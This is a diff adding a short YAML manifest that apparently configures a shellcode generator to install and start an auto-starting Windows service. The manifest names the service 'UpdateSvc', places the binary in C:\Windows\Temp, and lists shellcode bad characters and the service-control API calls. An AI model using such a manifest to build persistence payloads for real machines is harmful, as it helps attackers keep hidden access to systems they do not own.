@@ -1,0 +1,18 @@
+template: ir_service_persist
+# IR workflow: service persistence.
+# Installs a Windows service that auto-starts on boot, then starts it.
+#
+# Build:
+#   uv run emitrion emitrion/manifests/ir_service_persist.yaml \
+#       --service-name "UpdateSvc" \
+#       --dst "C:\\Windows\\Temp\\svc.exe" \
+#       --no-assemble --out emitter_out/
+badchars: ["00", "0a", "0d"]
+
+functions:
+  - LoadLibraryA
+  - OpenSCManagerA
+  - CreateServiceA
+  - StartServiceA
+  - CloseServiceHandle
+  - ExitProcess
